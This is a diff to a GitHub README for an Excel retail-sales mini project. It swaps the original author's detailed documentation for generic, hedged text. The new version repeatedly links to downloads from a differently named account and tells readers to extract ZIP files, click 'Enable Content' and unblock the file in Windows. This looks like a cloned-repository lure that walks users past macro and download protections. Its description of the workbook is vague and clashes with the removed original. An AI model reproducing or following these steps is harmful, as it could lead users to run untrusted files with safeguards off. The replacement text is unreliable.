@@ -1,170 +1,210 @@
-# 📊 Retail Store Sales Analysis — Advanced Excel Mini Project
+# 📊 Advanced-Excel-Retail-Sales-Analysis - Clear Retail Sales Insights Fast
 
-> **Platform:** Agileology (EdTech & Upskilling Platform)
-> **Submitted By:** Vathada Swaroop Kumar
-> **Duration:** Mar 15, 2026 – Mar 18, 2026
-> **Tool Used:** Microsoft Excel (Advanced)
+[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge)](https://github.com/Oscine-mustercall181/Advanced-Excel-Retail-Sales-Analysis)
 
----
+## 🧾 Overview
 
-## 📌 Project Overview
+Advanced-Excel-Retail-Sales-Analysis is an Excel mini project for retail store sales review. It helps you clean data, build formulas, create pivot tables, make charts, and view results in a dashboard.
 
-This project was completed as part of the Advanced Excel Mini Project
-assigned by Agileology. It involves end-to-end data analysis of a
-Retail Store Sales dataset containing 12,575 records using Microsoft
-Excel — covering data cleaning, advanced formulas, pivot tables,
-advanced charts and an interactive KPI dashboard.
+This project is meant for users who want to open an Excel file and work with sales data in a simple way. You do not need coding knowledge. You only need Microsoft Excel on Windows.
 
----
+## 🖥️ What You Need
 
-## 📁 Repository Files
+- A Windows PC
+- Microsoft Excel 2016 or later
+- Basic file access on your computer
+- Enough space to save the workbook and related files
 
-| File | Description |
-|------|-------------|
-| `retail_store_sales.xlsx` | Complete project workbook with all 7 sheets |
-| `Raw_retail_Store_sales_data.xlsx` | Original raw dataset (12,575 records, 11 columns) |
-| `Adv_Excel_Project_Documentation.pdf` | Full project documentation (7 pages) |
-| `Adv_Excel_Case_Scenario.pdf` | Instructor case scenario and requirements |
+## 📥 Download and Open
 
----
+1. Visit this page to download the project files:  
+   https://github.com/Oscine-mustercall181/Advanced-Excel-Retail-Sales-Analysis
 
-## 🗂️ Dataset Description
+2. On the GitHub page, look for the file list and download the workbook or project files.
 
-| Detail | Info |
-|--------|------|
-| Total Records | 12,575 rows |
-| Total Columns | 11 (original) → 15 (after cleaning) |
-| Date Range | January 2022 — January 2025 |
-| Unique Customers | 25 |
-| Categories | 8 (Butchers, Beverages, Food, Furniture, Patisserie, Milk Products, Electric Household Essentials, Computers & Electric Accessories) |
-| Payment Methods | Cash, Credit Card, Digital Wallet |
-| Locations | Online, In-store |
+3. Save the file to a folder you can find again, such as Downloads or Desktop.
 
----
+4. If the file is in a ZIP folder, right-click it and choose **Extract All**.
 
-## 📂 Workbook Sheet Structure
+5. Open the main Excel file with Microsoft Excel.
 
-| Sheet | Purpose |
-|-------|---------|
-| `Raw_Data` | Original untouched dataset — never modified |
-| `Cleaned_Data` | Cleaned data with 15 columns including 4 helper columns |
-| `Data_Analysis` | All formulas, functions and array calculations |
-| `Pivot_Summary` | 4 Pivot Tables, calculated field, 3 pivot charts, slicers and timeline |
-| `Advanced_Charts` | Combo Chart, Sparklines and Waterfall Chart |
-| `Dashboard` | Interactive KPI Dashboard with linked charts and slicers |
-| `Documentation` | Full project documentation sheet inside workbook |
+[![Download Project](https://img.shields.io/badge/Get%20Project%20Files-grey?style=for-the-badge)](https://github.com/Oscine-mustercall181/Advanced-Excel-Retail-Sales-Analysis)
 
----
+## 🔍 What This Project Does
 
-## 🧹 Data Cleaning Steps
+This workbook is built for retail sales analysis. It helps you inspect sales records and turn raw data into clear results.
 
-| Step | Action | Records Fixed |
-|------|--------|--------------|
-| 1 | Protected Raw_Data — copied to Cleaned_Data sheet | — |
-| 2 | Converted to Excel Table named SalesData (Ctrl+T) | — |
-| 3 | Checked duplicates — zero duplicates found | 0 |
-| 4 | Fixed blank cells in Discount Applied → FALSE | 4,199 |
-| 5 | Fixed blank cells in Item → "Unknown" | 1,213 |
-| 6 | Fixed blank cells in Price Per Unit → 0 | 609 |
-| 7 | Fixed blank cells in Quantity & Total Spent → 0 | 604 |
-| 8 | Added helper column: Month (=TEXT formula) | 12,575 |
-| 9 | Added helper column: Year (=YEAR formula) | 12,575 |
-| 10 | Added helper column: Month-Year combined label | 12,575 |
-| 11 | Added Sales Tier using Nested IF (High/Medium/Low) | 12,575 |
+Use it to:
 
----
+- Clean messy retail data
+- Sort and filter records
+- Apply formulas for quick checks
+- Build pivot tables for grouped views
+- Create charts for trends
+- Review a dashboard in one place
 
-## 🔢 Advanced Formulas & Functions Used
+## 📁 Main Parts of the Workbook
 
-| Formula / Function | Category | Purpose |
-|--------------------|----------|---------|
-| `=SUM(SalesData[Total Spent])` | Aggregate | Total revenue — Result: $1,552,071 |
-| `=AVERAGE(SalesData[Total Spent])` | Aggregate | Average order value — Result: $129.65 |
-| `=COUNTA(SalesData[Transaction ID])` | Aggregate | Total transactions — Result: 12,575 |
-| `=COUNTA(UNIQUE(SalesData[Customer ID]))` | Dynamic Array | Unique customers — Result: 25 |
-| `=COUNTIF(SalesData[Discount Applied],TRUE)` | Conditional | Discounted orders — Result: 4,219 |
-| `=SUMIF(SalesData[Category],"Butchers",SalesData[Total Spent])` | Conditional | Sales per category |
-| `=COUNTIF(SalesData[Category],"Beverages")` | Conditional | Orders per category |
-| `=SUMIFS(SalesData[Total Spent],SalesData[Location],"Online",SalesData[Year],2024)` | Multi-condition | Online sales 2024 — Result: $265,246.50 |
-| `=XLOOKUP(B51,SalesData[Transaction ID],SalesData[Total Spent],"Not Found")` | Lookup | Transaction lookup by ID |
-| `=UNIQUE(SalesData[Category])` | Dynamic Array | All unique categories |
-| `=SORT(UNIQUE(SalesData[Category]))` | Dynamic Array | Sorted unique categories |
-| `=FILTER(SalesData[Item],SalesData[Total Spent]>500)` | Dynamic Array | High value transactions |
-| `=LARGE(SalesData[Total Spent],{1,2,3,4,5})` | Dynamic Array | Top 5 sales values |
-| `=IF([@[Total Spent]]>500,"High",IF([@[Total Spent]]>200,"Medium","Low"))` | Logical | Sales tier classification |
-| `=TEXT([@[Transaction Date]],"MMMM")` | Date/Text | Extract month name |
-| `=YEAR([@[Transaction Date]])` | Date/Text | Extract year number |
-| `=TEXT([@[Transaction Date]],"MMM-YYYY")` | Date/Text | Month-Year label |
+### 🧹 Data Cleaning Sheet
 
----
+This sheet helps prepare the sales data for review. It may include steps like:
 
-## 📊 Pivot Tables & Charts
+- Removing duplicate rows
+- Fixing blank cells
+- Standardizing names and dates
+- Checking values for errors
 
-| Pivot Table | Rows | Values | Filter | Chart |
-|-------------|------|--------|--------|-------|
-| PT1 — Sales by Category | Category | SUM of Total Spent + Avg Sale Value (Calculated Field) | Year | Clustered Column |
-| PT2 — Monthly Sales Trend | Month-Year | SUM of Total Spent | Category | Line Chart |
-| PT3 — Payment Method | Payment Method | SUM of Total Spent | Location | Pie Chart |
-| PT4 — Online vs In-Store | Location | COUNT of Transaction ID | Year | Column Chart |
+### 🧮 Formula Section
 
-**Interactive Features:**
-- 3 Slicers — Category, Location, Payment Method (connected to all 4 Pivot Tables)
-- 1 Transaction Date Timeline (connected to all 4 Pivot Tables)
+This area uses Excel formulas to compute values such as:
 
----
+- Total sales
+- Average order value
+- Profit estimates
+- Sales counts by item or region
 
-## 📈 Advanced Charts
+### 📊 Pivot Table View
 
-| Chart | Data Used | Purpose |
-|-------|-----------|---------|
-| Combo Chart | Category vs Total Sales + Order Count | Compare sales value and order volume on dual axes |
-| Sparklines | Monthly Total Spent values | Mini trend lines showing monthly patterns inline |
-| Waterfall Chart | Month-Year vs Total Spent | Visualize monthly revenue gains and losses |
+Pivot tables help you group sales data by useful categories. You can review:
 
----
+- Sales by month
+- Sales by region
+- Sales by product line
+- Top-selling items
 
-## 🧮 Data Analysis Tools
+### 📈 Charts Section
 
-| Tool | How Used |
-|------|---------|
-| Goal Seek | Determined what Total Spent value is needed to reach $200,000 target revenue |
-| Scenario Manager | Built 3 scenarios — Low Sales ($50), Base Sales ($200), High Sales ($500) |
+Charts turn rows of numbers into easy-to-read visuals. Common chart types in this project may include:
 
----
+- Bar charts
+- Line charts
+- Column charts
+- Pie charts
 
-## 📉 Key Findings & Insights
+### 🖥️ Dashboard
 
-| # | Finding | Result |
-|---|---------|--------|
-| 1 | **Total Revenue** | $1,552,071 across 3 years (2022–2025) |
-| 2 | **Highest Selling Category** | Butchers — $208,118 |
-| 3 | **Lowest Selling Category** | Milk Products — $180,112 |
-| 4 | **Top Payment Method** | Cash — $537,710 |
-| 5 | **Online vs In-Store** | Online (6,354) slightly exceeded In-Store (6,221) |
-| 6 | **Peak Month** | January 2022 — $52,911.50 |
-| 7 | **Avg Order Value** | $129.65 per transaction |
-| 8 | **Discounted Orders** | 4,219 (33.5% of all orders) |
-| 9 | **Discounted Beverages Sales** | $67,696 |
-| 10 | **Credit Card Online Sales** | $260,851 |
+The dashboard brings the main results together in one view. It gives a quick look at key sales trends, top categories, and summary numbers.
 
----
+## 🚀 How to Use the File
 
-## 🎯 Skills Demonstrated
+1. Open the workbook in Microsoft Excel.
+2. Go to the data sheet first.
+3. Check that the sales table loads fully.
+4. Review the cleaned data sheet.
+5. Move to the pivot table tabs.
+6. Click the charts to inspect trends.
+7. Open the dashboard to see the full sales view.
 
-- ✅ Data Cleaning & Transformation
-- ✅ Advanced Formulas (SUMIFS, XLOOKUP, Dynamic Arrays, Nested IF)
-- ✅ Pivot Tables with Calculated Fields
-- ✅ Interactive Slicers & Timeline
-- ✅ Advanced Charts (Combo, Sparklines, Waterfall)
-- ✅ KPI Dashboard Design
-- ✅ What-If Analysis (Goal Seek, Scenario Manager)
-- ✅ Data Documentation
+## 🪟 Windows Setup Steps
 
----
+If Excel asks for permission when you open the file:
 
-## 👤 Author
-**Vathada Swaroop Kumar**
-Data Analytics Learner | Ex-TCS | Agileology Platform
+1. Click **Enable Editing** if the file opens in protected view.
+2. Click **Enable Content** if Excel asks for it.
+3. Wait for pivot tables and charts to refresh.
+4. Save the file under a new name if you want your own copy.
 
-- LinkedIn: [Swaroop Kumar Vathada](https://www.linkedin.com/in/swaroopkumarvathada)
+If the file does not open:
 
+1. Make sure Excel is installed.
+2. Check that the file was fully downloaded.
+3. Try opening it again from the saved folder.
+4. If the file is in ZIP format, extract it first.
+
+## 📋 Typical Use Cases
+
+- Review store sales for a school or college project
+- Compare sales by product group
+- Check which region sells the most
+- Study monthly sales patterns
+- Present sales data in a dashboard view
+
+## 🧰 Common Excel Skills Used
+
+This project uses core Excel tools that are common in business reports:
+
+- Data cleaning
+- Formulas and functions
+- Pivot tables
+- Charts
+- Conditional formatting
+- Filters and sorting
+- Dashboard layout
+
+## 📌 File Tips
+
+- Keep the original file unchanged
+- Save a working copy before editing
+- Use Excel, not a plain text editor
+- Do not rename sheet tabs unless you know they are linked
+- Refresh pivot tables if values seem stale
+
+## ❓ Simple Troubleshooting
+
+### File opens as plain text
+
+Open it with Microsoft Excel instead of Notepad.
+
+### Charts do not show data
+
+Check whether the source data is present and not filtered out.
+
+### Pivot table looks empty
+
+Refresh the pivot table from the Excel menu.
+
+### Some cells show errors
+
+Review the formula cells and check for deleted input data.
+
+### File is blocked by Windows
+
+Right-click the file, open **Properties**, and check whether Windows marked it as downloaded. If needed, allow it to open.
+
+## 📚 About the Data
+
+The workbook is based on retail sales analysis and uses a dataset structure that fits store reporting. It may include fields such as:
+
+- Order ID
+- Date
+- Product name
+- Category
+- Region
+- Quantity
+- Sales amount
+- Profit
+- Customer type
+
+These fields help build a clear view of store performance.
+
+## 🧭 Best Way to Review the Dashboard
+
+Start with the top summary numbers. Then check the charts for trends. After that, use the pivot tables to look at the details behind each metric.
+
+A good review flow is:
+
+1. Total sales
+2. Profit
+3. Sales by category
+4. Sales by region
+5. Monthly trend
+6. Top products
+
+## 🗂️ Repository Topics
+
+- advanced-excel
+- dashboard
+- data-analysis
+- data-cleaning
+- data-visualization
+- eda
+- excel
+- exploratory-data-analysis-eda
+- pivot-tables
+- retail-sales
+- spreadsheets
+
+## 📎 Project Link
+
+Open the project page here:  
+https://github.com/Oscine-mustercall181/Advanced-Excel-Retail-Sales-Analysis
